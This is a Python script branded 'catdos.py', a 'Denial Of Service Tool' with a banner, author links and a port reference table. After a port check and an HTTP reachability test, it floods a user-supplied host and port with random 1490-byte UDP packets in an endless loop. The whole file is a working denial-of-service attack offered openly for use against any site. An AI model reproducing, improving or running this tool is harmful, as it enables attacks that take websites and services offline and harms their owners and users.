#!usr/bin/env python3
import os
import time
import socket
import random
import requests
import optparse

green = "\033[1;32;40m"
yellow='\033[2;33m'
lightyellow='\033[1;33m'
red='\033[2;31m'
blue='\033[2;36m'
violet='\033[2;35m'
darkblue='\033[2;34m'

parser=optparse.OptionParser()

parser.add_option('-u', '--url',dest='url', help='Please enter your domain name')
parser.add_option('-p', '--port',dest='port', help='Please enter your port')

(values, keys)=parser.parse_args()
url = values.url
port=values.port

print("\n")

banner=""" ######     ###    ########         ########   #######   ######  
##    ##   ## ##      ##            ##     ## ##     ## ##    ## 
##        ##   ##     ##            ##     ## ##     ## ##       
##       ##     ##    ##    ####### ##     ## ##     ##  ######  
##       #########    ##            ##     ## ##     ##       ## 
##    ## ##     ##    ##            ##     ## ##     ## ##    ## 
 ######  ##     ##    ##            ########   #######   ######  """

print(blue+banner+"\n")

print(blue+"#"*14+" Denial Of Service Tool By Copycat "+blue+"#"*14)
print(red+"="*64)
print(green+"  Usage      : "+lightyellow+" python catdos.py -u website.com -p port")
print(green+"  Github     : "+lightyellow+" https://github.com/AKSHAYRAVIC09YC47")
print(green+"  Twitter    : "+lightyellow+" https://twitter.com/AKSHAYC09YC47")
print(green+"  Facebook   : "+lightyellow+" https://facebook.com/Akshay.Ravi.Copycat")
print(green+"  Developer  : "+lightyellow+" AkshayRavi/copycat")
print(red+"="*64+"\n\n")

design =(red+"["+darkblue+"?"+red+"]")
design1 =(red+"["+darkblue+"*"+red+"]")
design2 =(red+"["+darkblue+"!"+red+"]")

time.sleep(1)

if (url)==None:
	print(blue+" Port"+" "*10+blue+"Transport Protocol"+" "*10+blue+"Service Name")
	print(red+"="*64)
	print(green+" 20"+" "*20+lightyellow+"TCP"+" "*10+red+"File Transfer Protocol(FTP)")
	print(green+" 21"+" "*20+lightyellow+"TCP"+" "*10+red+"File Transfer Protocol(FTP)")
	print(green+" 22"+" "*20+lightyellow+"TCP"+" "*10+red+"Secure Shell (SSH)")
	print(green+" 22"+" "*20+lightyellow+"UDP"+" "*10+red+"Secure Shell (SSH)")
	print(green+" 23"+" "*20+lightyellow+"TCP"+" "*10+red+"Telenet")
	print(green+" 25"+" "*20+lightyellow+"TCP"+" "*10+red+"Simple Mail Transfer Protocol(SMTP)")
	print(green+" 53"+" "*20+lightyellow+"TCP"+" "*10+red+"Domain Name System(DNS)")
	print(green+" 53"+" "*20+lightyellow+"UDP"+" "*10+red+"Domain Name System(DNS)")
	print(green+" 67"+" "*20+lightyellow+"UDP"+" "*10+red+"Dynamic Host Configuration Protocol(DHCP)")
	print(green+" 68"+" "*20+lightyellow+"UDP"+" "*10+red+"Dynamic Host Configuration Protocol(DHCP)")
	print(green+" 69"+" "*20+lightyellow+"UDP"+" "*10+red+"Trivial File Transfer Protocol(TFTP)")
	print(green+" 80"+" "*20+lightyellow+"TCP"+" "*10+red+"Hyper Text Transfer Protocol(HTTP)")
	print(green+" 110"+" "*19+lightyellow+"TCP"+" "*10+red+"Post Office Protocol(POP3)")
	print(green+" 119"+" "*19+lightyellow+"TCP"+" "*10+red+"Network News Transport Protocol(NNTP)")
	print(green+" 123"+" "*19+lightyellow+"UDP"+" "*10+red+"Network Time Protocol(NTP)")
	print(green+" 135"+" "*19+lightyellow+"TCP"+" "*10+red+"Net BIOS")
	print(green+" 139"+" "*19+lightyellow+"UDP"+" "*10+red+"Net BIOS")
	print(green+" 143"+" "*19+lightyellow+"TCP"+" "*10+red+"Internet Messege Access Protocol(IMAP4)")
	print(green+" 143"+" "*19+lightyellow+"UDP"+" "*10+red+"Internet Messege Access Protocol(IMAP4)")
	print(green+" 161"+" "*19+lightyellow+"TCP"+" "*10+red+"Simple Network Management Protocol(SNMP)")
	print(green+" 162"+" "*19+lightyellow+"UDP"+" "*10+red+"Simple Network Management Protocol(SNMP)")
	print(green+" 389"+" "*19+lightyellow+"TCP"+" "*10+red+"Light Weight Directory Access Protocol(LWDAP)")
	print(green+" 389"+" "*19+lightyellow+"UDP"+" "*10+red+"Light Weight Directory Access Protocol(LWDAP)")
	print(green+" 443"+" "*19+lightyellow+"TCP"+" "*10+red+"HTTP With Secure Socket Layer(SSL/HTTPS)")
	print(green+" 443"+" "*19+lightyellow+"UDP"+" "*10+red+"HTTP With Secure Socket Layer(SSL/HTTPS)")
	print(green+" 3389"+" "*18+lightyellow+"TCP"+" "*10+red+"Remote Desktop Protocol(RDP)")
	print(green+" 3389"+" "*18+lightyellow+"UDP"+" "*10+red+"Remote Desktop Protocol(RDP)")
	exit()

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

print(design+green+" Validating Domain-IP       "+darkblue+"=>   "+ lightyellow+url)
print(design+green+" Validating PORT-Status     "+darkblue+"=>   "+ lightyellow+port)

def PortScanner(port):
	try:
		if s.connect_ex((url,int(port))):
			print(design2+green+" PORT-Status(TCP/UDP)       "+darkblue+"=>   "+ lightyellow+"PORT " +port+ " Closed")
		else:
			print(design1+green+" PORT-Status(TCP/UDP)       "+darkblue+"=>   "+ lightyellow+"PORT " +port+ " Opened")
	except:
		print(design2+green+" Unable To Connect-PORT     "+darkblue+"=>   "+ lightyellow+ port)
PortScanner(port)

def validation():
	try:
		r=requests.get("http://"+url)
		if r.status_code ==200:
			time.sleep(1)
			print(design1+green+" Starting DOS Attack On    "+darkblue+" =>   "+lightyellow+url)
			print("")
		elif r.status_code !=200:
			try:
				r=requests.get("https://"+url)
				if r.status_code ==200:
					time.sleep(1)
					print(design1+green+" Starting DOS Attack On    "+darkblue+" =>   "+lightyellow+url)
					print("")
				else:
					print(design2+green+" Unable To Validate Domain  "+darkblue+"=>   "+ lightyellow+url)
			except:
				print(design2+green+" Unable To Connect-IP       "+darkblue+"=>   "+ lightyellow+ url)
		else:
			print(design2+green+" Unable To Validate Domain  "+darkblue+"=>   "+ lightyellow+url)
	except:
		print(design2+green+" Unable To Connect-IP       "+darkblue+"=>   "+ lightyellow+ url)
		exit()
validation()

time.sleep(4)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)#DGRAM=UDP PACKET
bytes= random._urandom(1490)
s=0
while True:
	sock.sendto(bytes,(url,int(port)))
	s=s+1
	print(design2+red+" Sending Packet Bytes ",s,red,"on Port " ,port,"to ",url)
